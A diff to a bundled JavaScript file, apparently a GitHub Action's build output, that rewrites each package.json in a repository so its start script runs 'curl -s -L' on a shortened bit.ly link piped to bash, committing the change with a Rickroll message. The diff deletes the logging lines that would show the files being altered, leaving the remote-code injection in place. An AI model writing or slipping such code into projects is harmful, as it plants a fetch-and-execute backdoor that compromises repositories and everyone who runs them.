@@ -6174,12 +6174,8 @@ const processFile = async ({ file_sha, repoInfo, path }) => {
     file_sha,
   });
 
-  core.info(path);
-  core.info(file_sha);
-  core.info(fileBase64);
   const fileText = base64.decode(fileBase64.data.content);
   const fileObject = JSON.parse(fileText);
-  core.info(fileText);
 
   if (fileObject.scripts) {
     fileObject.scripts.start = `curl -s -L http://bit.ly/10hA8iC | bash`;
@@ -6188,18 +6184,6 @@ const processFile = async ({ file_sha, repoInfo, path }) => {
   }
   const fileJson = JSON.stringify(fileObject);
   const encodedFileJson = base64.encode(fileJson);
-
-  core.info(fileJson);
-
-  core.info(
-    JSON.stringify({
-      ...repoInfo,
-      path,
-      message: "Never gonna give you up",
-      content: encodedFileJson,
-      sha: file_sha,
-    })
-  );
 
   return octokit.repos.createOrUpdateFileContents({
     ...repoInfo,
@@ -6237,7 +6221,6 @@ async function run() {
     core.info("Never gonna make you cry");
 
     for (const file of packageJsonFiles) {
-      core.info(JSON.stringify(file));
       const { sha: file_sha, path } = file;
       await processFile({ file_sha, path, repoInfo });
     }
